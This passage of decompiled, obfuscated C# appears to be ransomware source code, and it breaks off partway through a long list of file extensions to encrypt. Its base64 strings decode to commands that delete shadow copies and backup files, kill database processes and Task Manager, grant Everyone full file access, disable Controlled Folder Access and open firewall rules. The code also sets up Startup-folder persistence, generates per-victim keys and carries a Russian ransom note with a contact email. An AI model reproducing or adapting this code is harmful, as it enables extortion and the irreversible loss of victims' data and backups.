		oMKRHTBqYRfOk("L0lNIG15c3FsZC1udC5leGUgL0Y="),
		oMKRHTBqYRfOk("L0lNIHdvcmRwYWQuZXhlIC9G"),
		oMKRHTBqYRfOk("L0lNIG15c3FsZC1vcHQuZXhlIC9G"),
		oMKRHTBqYRfOk("L0lNIG9jYXV0b3VwZHMuZXhlIC9G"),
		oMKRHTBqYRfOk("L0lNIG9jc3NkLmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIG9yYWNsZS5leGUgL0Y="),
		oMKRHTBqYRfOk("L0lNIHNxbGFnZW50LmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIHNxbGJyb3dzZXIuZXhlIC9G"),
		oMKRHTBqYRfOk("L0lNIHNxbHNlcnZyLmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIHN5bmN0aW1lLmV4ZSAvRg==")
	};

	public static List<string> JNcObsVMzwaXqv = new List<string>
	{
		oMKRHTBqYRfOk(IPHxEYiEhccEgJV("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR")),
		oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		oMKRHTBqYRfOk(IPHxEYiEhccEgJV("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR"))
	};

	public static string PgMUbAxWXI = oMKRHTBqYRfOk("R2V0LVdtaU9iamVjdCBXaW4zMl9TaGFkb3djb3B5IHwgRm9yRWFjaC1PYmplY3QgeyAkX0RlbGV0ZSgpOyB9");

	public static List<string> aNwBUUqhGtLFvJ = new List<string>
	{
		oMKRHTBqYRfOk("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		oMKRHTBqYRfOk("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		oMKRHTBqYRfOk("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		oMKRHTBqYRfOk("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		oMKRHTBqYRfOk("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		oMKRHTBqYRfOk("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static List<string> uGHBYLBfRrA = new List<string>
	{
		oMKRHTBqYRfOk("IkM6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		oMKRHTBqYRfOk("IkQ6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		oMKRHTBqYRfOk("Ilo6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E=")
	};

	public static string RvXwlpKWgUqArdvu = "NO";

	public static string UvaPDtlsoZ = "NO";

	internal static DateTime bBscGbmILhYDut = new DateTime(2000, 1, 1);

	internal static DateTime gfeZJOxXMpBSu = new DateTime(2100, 1, 1);

	public static string YvhlPQrYyPhB = "YES";

	public static string XZspBinZvbc = "10";

	public static string kUvXzUNEQSmOgoU = "NO";

	public static string bYSDTWtBRFoMLMUw = "NO";

	public static string IUVLTrSGCNEFgir = "NO";

	public static string wZPQrpRzMll = "YES";

	public static string jcyPPQRuMNBV = "NO";

	public static string XiSfijQzOr = "NO";

	public static List<string> HLlzhaBALyehKMW = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string LNfftKTeaLEJxe = "NO";

	public static string jUyryfTlTABVm = "1";

	public static string jAdmyKGEsaBUh = "YES";

	public static string CKQbZpYfqsJAt = "NO";

	public static string CmNQsgAsPTLdr = "NO";

	public static string PKLvCQuQNcTS = string.Empty;

	public static string mQYKbeuyHhKQP = "NO";

	public static string ILHnWjQjfUkffJe = "YES";

	public static string EMkDRelwWGZ = "YES";

	public static string EhKqkDBbta = "0JLQvdC40LzQsNC90LjQtSDQktC90LjQvNCw0L3QuNC1INCS0L3QuNC80LDQvdC40LUhISE=";

	public static string hXdhfhCZQZwsD = "0KMg0LLQsNGBINGB0LvQvtC20L3QvtGB0YLQuCDRgSBJVCDQsdC10LfQvtC/0LDRgdC90L7RgdGC0YzRjj8NCg0K0J3QsNGI0Lgg0YHQv9C10YbQuNCw0LvQuNGB0YLRiyDQktCw0Lwg0LPQsNGA0LDQvdGC0LjRgNC+0LLQsNC90L4g0L/QvtC80L7Qs9GD0YIuDQoNCtCU0LvRjyDRjdGC0L7Qs9C+INC90LDQv9C40YjQuNGC0LUg0L3QsNC8INC90LAg0L/QvtGH0YLRgyAtIHNlY3VyaXR5ODQ5QG51a2UuYWZyaWNh";

	public static string rAOdTJDjvf = "NO";

	public static string TTjoQWzJaWoUj = "YES";

	public static string SHnoEunPucmQ = "NO";

	public static string SVkgOVyoDb = "YES";

	public static string rnQClixIasoUk = "NO";

	public static string fFemGrmzsojBt = "LOGONISOFF";

	public static string uBZpIqctGlnnN = "NO";

	public static string CpuCxDkASAKU = "YES";

	public static string SGHDaCxgQr = "mystartup.lnk";

	public static string qFDgnyGhwfm = "NO";

	public static string HkcjRmtfzgYbbl = "YES";

	public static string HbxHJoiXAuWQ = "NO";

	public static string vJXCvrLeIURfhG = "NO";

	public static string RWvNPbkGfQ = "VGhhbm9z";

	public static string XXZSvUyKJS = "YES";

	public static string NpsmwfcYiqSGR = "NO";

	public static string VbHJPaaQsEoCZHSl = "NO";

	public static string VnmuFCXwLb = "YES";

	public static string[] OlEsalIPJXyhSZEgg = new string[9] { "ragent.exe", "rmngr.exe", "rphost.exe", "1cv8.exe", "sql.exe", "sqld.exe", "mysql.exe", "mysqld.exe", "oracle.exe" };

	public static string KGlWteEpKYfz = "YES";

	public static bool sWEYqVGQKvAbKzrbA = true;

	public static string nsyymqqKpcXoy = "YES";

	public static bool txjxRPsHuzRR = false;

	public static bool hdKvmQeIrHY = true;

	public static bool yeDznzCWCgTL = true;

	public static bool SQFadnwkoNIbWf = true;

	public static string OpWBXzCwVRYsxq = "Debug_Log.txt";

	public static bool vQOhJPfkmenqxsh = false;

	public static bool qXKhyFzEohGXJJ = true;

	public static bool kqmFHAnOmHm = false;

	public static bool qsDIrveZaNzAq = false;

	public static bool kqkNEUMWxoNDeP = true;

	public static string MwUDomDUGsVhYA = "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + BhEjWEybWo.NJvLMAETTUmhx() + ".txt";

	public static List<string> YTTlQKYVEhwWmOpJ = new List<string>();

	public static List<string> UfvFMUrtpRxlu = new List<string>();

	public static List<string> XcEEPGrLNtid = new List<string>();

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate18;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate19;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1c;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegate2b;

	private static void Main(string[] args)
	{
		try
		{
			uwwAILDuwIQs CS_0024_003C_003E8__locals0 = new uwwAILDuwIQs();
			CS_0024_003C_003E8__locals0.ZERToGKXzmayuo = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.ZERToGKXzmayuo) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			SIWOzTgeUaCFrANst.uxYeAglHxGZeDCRK(qygfGaCSBKuMaYS);
		}
		catch (Exception)
		{
		}
		try
		{
			if (XXZSvUyKJS == "YES")
			{
				Thread thread = new Thread(fjPoGquRHqRM.MMLhPvVoFXnmIS);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (ubsfdUxyfp == "YES")
		{
			Thread.Sleep(int.Parse(DmygpjMfFmdLKl));
		}
		if (jAdmyKGEsaBUh == "YES")
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					VjMyonYihPlVlJK CS_0024_003C_003E8__locals1 = new VjMyonYihPlVlJK();
					CS_0024_003C_003E8__locals1.HWzAhZljHiEK = new string[4]
					{
						oMKRHTBqYRfOk("VGFza21ncg=="),
						oMKRHTBqYRfOk("dGFza21ncg=="),
						oMKRHTBqYRfOk("UHJvY2Vzc0hhY2tlcg=="),
						oMKRHTBqYRfOk("cHJvY2V4cA==")
					};
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						VqpeLWAVRhnNLC.BJvMQPSHzrRdKdx(CS_0024_003C_003E8__locals1.HWzAhZljHiEK);
					});
					thread2.IsBackground = true;
					thread2.Start();
				}
			}
			catch
			{
			}
			try
			{
				DTdWWHxzAiIAhv.GUEWdlPnMvlQAx(oMKRHTBqYRfOk("dGFza21ncg=="));
			}
			catch
			{
			}
			try
			{
				DTdWWHxzAiIAhv.GUEWdlPnMvlQAx(oMKRHTBqYRfOk("cHJvY2V4cA=="));
			}
			catch
			{
			}
			try
			{
				DTdWWHxzAiIAhv.GUEWdlPnMvlQAx(oMKRHTBqYRfOk("cHJvY2V4cDY0"));
			}
			catch
			{
			}
			try
			{
				DTdWWHxzAiIAhv.GUEWdlPnMvlQAx(oMKRHTBqYRfOk("UHJvY2Vzc0hhY2tlcg=="));
			}
			catch
			{
			}
			Thread thread3 = new Thread(VqpeLWAVRhnNLC.YPxFSRPJzDpLIv);
			thread3.IsBackground = true;
			thread3.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && jcyPPQRuMNBV == "YES")
		{
			try
			{
				ICvwPzGGqyQhqi(oMKRHTBqYRfOk("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		if (eaZoKQQqQZielZ == "YES")
		{
			tsUMgpGERQSp.fCjafLSvJfWq();
		}
		try
		{
			if (QwQuntCagGTAD == "YES" && wMBwtBozwWCs.RYYrBRxnizn())
			{
				new TZgsKakdaVKQciq().gSbadMzFSeu(bool_0: false);
				wMBwtBozwWCs.jmSSUKsAfvHgD();
			}
		}
		catch (Exception)
		{
		}
		if (naEJQRwrPwowmubCfC == "YES" && wMBwtBozwWCs.RYYrBRxnizn())
		{
			new TZgsKakdaVKQciq().gSbadMzFSeu(bool_0: false);
			new TZgsKakdaVKQciq().UYThlCsjAz();
		}
		if (qUnWPmXugZmhz == "YES")
		{
			zMTntIYuuvYev.jCyJrDoNBUe();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
			string text2 = text + Path.GetFileName(fileName);
			if (LbwMCCprGBEIfG == "YES" && fileName != text2)
			{
				Thread thread4 = new Thread(bzrTFBJEroUqd);
				thread4.IsBackground = true;
				thread4.Priority = ThreadPriority.Normal;
				thread4.Start();
			}
			if (PZtctlGFWSPg == "YES" && mainModule != null && fileName != text2)
			{
				try
				{
					kqWotmnIUhMss = odeHSPcZur(0, HDBJOODGwwozS.Count);
					File.Copy(fileName, text + HDBJOODGwwozS[kqWotmnIUhMss], overwrite: true);
					Process.Start(text + HDBJOODGwwozS[kqWotmnIUhMss]);
					PNdHksrWsNzLSUd();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (RvXwlpKWgUqArdvu == "YES" && DateTime.Now < bBscGbmILhYDut)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (UvaPDtlsoZ == "YES" && DateTime.Now > gfeZJOxXMpBSu)
			{
				PNdHksrWsNzLSUd();
			}
		}
		catch
		{
		}
		aAebNXDYZjDhw();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate
			{
				List<string> source = lsWtVCsEzBTL;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						uATAppcKlZ("sc.exe", string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				List<string> source2 = yYvMwQIIRucF;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
					{
						uATAppcKlZ("net.exe", string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
				List<string> source3 = vptJpYJhZlMRM;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 = delegate(string string_0)
					{
						uATAppcKlZ(oMKRHTBqYRfOk("dGFza2tpbGwuZXhl"), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate18);
				if (VnmuFCXwLb == "YES")
				{
					string[] olEsalIPJXyhSZEgg = OlEsalIPJXyhSZEgg;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 = delegate(string string_0)
						{
							uATAppcKlZ(oMKRHTBqYRfOk("dGFza2tpbGwuZXhl"), "/IM " + string_0 + " /f");
						};
					}
					Parallel.ForEach(olEsalIPJXyhSZEgg, CS_0024_003C_003E9__CachedAnonymousMethodDelegate19);
				}
				if (!OLRxBoNESYHA().Contains("XP"))
				{
					EnvRhAFwnNeKeW(PgMUbAxWXI);
				}
				else
				{
					List<string> jNcObsVMzwaXqv = JNcObsVMzwaXqv;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a = delegate(string string_0)
						{
							uATAppcKlZ(oMKRHTBqYRfOk(IPHxEYiEhccEgJV("lhXZu4WatRWYzNnd")), string_0);
						};
					}
					Parallel.ForEach(jNcObsVMzwaXqv, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a);
				}
				List<string> source4 = aNwBUUqhGtLFvJ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b = delegate(string string_0)
					{
						uATAppcKlZ(oMKRHTBqYRfOk("ZGVsLmV4ZQ=="), string_0);
					};
				}
				Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b);
				List<string> source5 = uGHBYLBfRrA;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1c == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate1c = delegate(string string_0)
					{
						uATAppcKlZ("icacls", string_0);
					};
				}
				Parallel.ForEach(source5, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1c);
			};
		}
		Thread thread5 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		thread5.Priority = ThreadPriority.Normal;
		thread5.IsBackground = true;
		thread5.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && yeDznzCWCgTL)
			{
				try
				{
					Thread thread6 = new Thread(slznwupxHPlJ.VnijWvoutZnJ);
					thread6.IsBackground = true;
					thread6.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			uATAppcKlZ("cmd.exe", oMKRHTBqYRfOk("L2MgcmQgL3MgL3EgJVNZU1RFTURSSVZFJVxcJFJlY3ljbGUuYmlu"));
			uATAppcKlZ("cmd.exe", oMKRHTBqYRfOk("L2MgcmQgL3MgL3EgRDpcXCRSZWN5Y2xlLmJpbg=="));
			uATAppcKlZ(oMKRHTBqYRfOk("bmV0c2g="), oMKRHTBqYRfOk("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJOZXR3b3JrIERpc2NvdmVyeVwiIG5ldyBlbmFibGU9WWVz"));
			uATAppcKlZ(oMKRHTBqYRfOk("bmV0c2g="), oMKRHTBqYRfOk("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9IkZpbGUgYW5kIFByaW50ZXIgU2hhcmluZyIgbmV3IGVuYWJsZT1ZZXM="));
		}
		if (kdbxgjgptILmf == "YES" && oTRBkZZrvG() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread7 = new Thread(kRQDUzryMSl.cMlMdpeeaKGoIlR);
			thread7.IsBackground = false;
			thread7.Priority = ThreadPriority.Normal;
			thread7.Start();
		}
		_ = MEfeXGAJzJqj == "YES";
		SecureString secureString = new SecureString();
		if (kUvXzUNEQSmOgoU == "NO")
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			FYndIeNOJJCR = "O8ESC2CXZC6QQJW23RXIVQVTC6PBL9OA";
		}
		nFHjUKNuaEOj = HAbvOFkMJVoSN.IOEmPutvAYpeIgr(DhkyAUdEoqAPuutg(secureString));
		if (ILHnWjQjfUkffJe == "YES")
		{
			bIoyQTORDlN();
		}
		if (kqmFHAnOmHm)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), MwUDomDUGsVhYA)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), MwUDomDUGsVhYA), string.Concat(oMKRHTBqYRfOk("Q2xpZW50IElQOiA="), new WebClient().DownloadString(oMKRHTBqYRfOk("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r\n", oMKRHTBqYRfOk("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", oMKRHTBqYRfOk("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), nFHjUKNuaEOj));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), MwUDomDUGsVhYA), "\r\nAdditional KeyID: " + nFHjUKNuaEOj);
				}
			}
			catch (Exception ex7)
			{
				if (vQOhJPfkmenqxsh)
				{
					try
					{
						File.AppendAllText(OpWBXzCwVRYsxq, "Error while creating Local Report: " + ex7.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		MfgvfCTaoTui.qVeMtrHnSvB(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), SGHDaCxgQr), WEEGseTDeH(nFHjUKNuaEOj), null, null, "Installer...", "Ctrl+Shift+X", null);
		if (TTjoQWzJaWoUj == "YES")
		{
			try
			{
				qBOJnbpOcHbwx();
			}
			catch
			{
			}
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			esQslEvKNI();
		}
		try
		{
			SPaVkRNulTSot(new string[1] { "[auto]" }, new string[4741]
			{
				"db", "dbf", "accdb", "dbx", "mdb", "mdf", "epf", "ndf", "ldf", "1cd",
				"sdf", "nsf", "fp7", "cat", "log", "$$$", "$db", "$efs", "$er", "^^^",
				"__a", "__b", "{pb", "~cw", "~hm", "0", "000", "001", "1", "101",
				"103", "108", "110", "113", "123", "128", "17t", "1CD", "1pe", "1ph",
				"1sp", "1st", "2", "2mg", "2Q0", "2QM", "3", "3d", "3d4", "3dd",
				"3df", "3df8", "3dm", "3dmdef", "3dp", "3dr", "3ds", "3dt", "3dw", "3dxml",
				"3fr", "3g2", "3ga", "3gp", "3gp2", "3me", "3MF", "3mm", "3pe", "3pr",
				"3w", "4dd", "4dl", "4dv", "4fs", "4w7", "5vw", "602", "73b", "73c",
				"73l", "7z", "7z001", "7z002", "7zip", "8", "86f", "89t", "89y", "8ba",
				"8bc", "8be", "8bf", "8bi8", "8bl", "8bs", "8bx", "8by", "8li", "8svx",
				"8xg", "8xk", "8xs", "8xt", "8xv", "9xt", "9xy", "a$v", "a00", "a01",
				"a02", "a2c", "a5l", "a5w", "a65", "aa", "aa3", "aac", "aaf", "aah",
				"aam", "aao", "aaui", "ab", "ab1", "ab3", "ab4", "ab65", "aba", "abbu",
				"abc", "abcd", "abf", "abi", "abk", "abkprj", "abp", "abt", "abw", "aby",
				"ac2", "ac3", "ac5", "aca", "acc", "accdc", "accde", "accdr", "accdt", "accft",
				"ACCTB", "ace", "acf", "acg", "ach", "ACL", "acp", "acq", "acr", "acrobatsecuritysettings",
				"acrodata", "acroplugin", "acrypt", "act", "acz", "ad", "ada", "adb", "adc", "adcp",
				"add", "addism", "ade", "adf", "adi", "adif", "adoc", "ados", "adox", "adp",
				"adpb", "adr", "ads", "adt", "adu", "adv", "advs", "adx", "adz", "aea",
				"aec", "aep", "aepx", "aes", "aet", "afd", "afdesign", "afe", "aff", "afi",
				"afm", "afp", "aft", "agd", "agd1", "agdl", "age3rec", "age3sav", "age3scn", "age3xrec",
				"age3xsav", "age3xscn", "age3yrec", "age3ysav", "age3yscn", "aggr", "ahf", "ai", "aif", "aifb",
				"aiff", "aim", "ain", "AIO", "aip", "ais", "ait", "ak", "al", "al8",
				"ala", "alb3", "alb4", "alb5", "alb6", "alc", "ald", "aldf", "alf", "ali",
				"allet", "alt3", "alt5", "alz", "AM", "amb", "amc", "amf", "aml", "amm",
				"amr", "amsorm", "amt", "amu", "amx", "amxx", "an1", "an8", "anime", "anl",
				"anme", "ann", "ans", "ansr", "ansym", "anx", "aoi", "ap", "apa", "apalbum",
				"apd", "ape", "apf", "aph", "api", "apj", "apk", "aplibrary", "apnx", "apo",
				"app", "APPCACHE", "approj", "APPX", "apr", "apt", "apw", "apxl", "apz", "ar",
				"arc", "arch00", "archiver", "arduboy", "arff", "ari", "arj", "arn", "aro", "arr",
				"ars", "art", "arw", "as", "as$", "as3", "asa", "asc", "ascm", "ascx",
				"asd", "ase", "asf", "ashbak", "ashdisc", "ashprj", "ashx", "ask", "asl", "asm",
				"asmx", "asn", "asnd", "asp", "aspx", "asr", "asset", "ast", "asv", "asvx",
				"asx", "atf", "ath", "atl", "atomsvc", "atr", "ats", "atw", "automaticdestinations-ms", "aux",
				"av", "avc", "avhd", "avhdx", "avj", "avl", "avn", "avp", "avs", "AW",
				"awb", "awbr", "awd", "awdb", "awe", "awg", "awp", "aws", "awt", "aww",
				"awwp", "ax", "azf", "azs", "azw", "azw1", "azw3", "azw4", "azz", "azzx",
				"b", "b1", "b27", "b2a", "b5i", "b5t", "b64", "b6i", "b6t", "b6z",
				"ba", "ba6", "ba7", "ba8", "ba9", "bac", "back", "backup", "backupdb", "bad",
				"bafl", "bak", "bak~", "bak2", "bak3", "bakx", "bamboopaper", "bank", "bar", "baserproj",
				"bau", "bax", "bay", "bbb", "bbcd", "bbl", "bbprojectd", "bbs", "bbxt", "bbz",
				"bc", "bc5", "bc6", "bc7", "bcc", "bcd", "bci", "bck", "bckp", "bcl",
				"bcm", "bcp", "bct", "bdb", "bdb2", "bdc", "bdf", "bdic", "bdoc", "bdp",
				"bdr", "bdt2", "bdt3", "bean", "bed", "bfa", "bff", "bfx", "bgl", "bgt",
				"bgv", "bh", "bho", "bi8", "bib", "bibtex", "bic", "bif", "bifx", "big",
				"bik", "bil", "bim", "bin", "bina", "binary", "bionix", "BIT", "bizdocument", "bjl",
				"bjo", "bk", "bk!", "bk1", "bk2", "bk3", "bk4", "bk5", "bk6", "bk7",
				"bk8", "bk9", "bkc", "bkf", "bkg", "bkp", "bks", "bkup", "bkz", "blb",
				"bld", "blend", "blend1", "blend2", "blg", "blk", "blm", "bln", "blob", "blockplt",
				"blogthis", "blp", "bluebutton", "bm2", "bm3", "bmc", "bmf", "bmk", "bml", "bmm",
				"bmml", "bmpr", "bms", "bna", "bndl", "bnk", "boc", "bok", "boo", "book",
				"bookexport", "bop", "box", "bp1", "bp2", "bp3", "bpa", "bpb", "bpd", "bpdx",
				"bpf", "bphys", "bpj", "bpk", "bpl", "bplx", "bpm", "bpmc", "bpn", "bps",
				"bpw", "brain", "brd", "breaking_bad", "brf", "brh", "brl", "brn", "BROWSER", "brs",
				"brw", "brx", "bsa", "bsd", "bsdl", "bsk", "bso", "bsp", "bst", "btd",
				"btf", "btif", "btinstall", "BTL", "btm", "btoa", "btr", "btx", "BUD", "bul",
				"bundle", "bup", "burn", "burntheme", "bvd", "bvp", "bwa", "bwd", "bwf", "bwi",
				"bwp", "bws", "bwt", "bwz", "BXF", "bxx", "bz", "bz2", "bza", "bzabw",
				"bzip", "bzip2", "c", "c00", "c01", "c02", "c10", "c2e", "c3d", "c4p",
				"c6", "cadoc", "cae", "caf", "cag", "calca", "cam", "camm", "camproj", "cap",
				"capt", "capx", "car", "caro", "cas", "catproduct", "cav", "cawr", "cb7", "cba",
				"cbf", "cbg", "cbmap", "cbor", "cbr", "cbs", "cbt", "cbu", "cbz", "cc",
				"cca", "ccc", "ccd", "ccf", "cch", "ccitt", "ccld", "ccp", "cct", "cd",
				"cd1", "cd2", "cdb", "cdc", "cdd", "cddz", "cdf", "cdi", "cdk", "cdl",
				"cdm", "cdml", "cdmm", "cdmz", "cdp", "cdpz", "cdr", "cdr3", "cdr4", "cdr5",
				"cdr6", "cdrw", "cds", "cdt", "cdtx", "cdx", "cdxml", "ce1", "ce2", "cef",
				"cel", "celtx", "cenon~", "cer", "cert", "cf", "cf5", "cfa", "cfb", "cfd",
				"cfg", "cfp", "cfr", "cfs", "cfx", "cgf", "cgfiletypetest", "cgi", "cgm", "cgp",
				"chg", "chi", "chk", "chm", "chml", "chmprj", "chp", "chpscrap", "CHR", "cht",
				"chtml", "cib", "cida", "cif", "cipo", "circ", "ciso", "civ4worldbuildersave", "civbeyondswordsave", "ck9",
				"ckp", "ckt", "cl2", "cl2arc", "cl2doc", "cl5", "clam", "clarify", "class", "classlist",
				"clb", "cld", "clg", "clix", "clk", "clkd", "clkm", "clks", "clkt", "clktk",
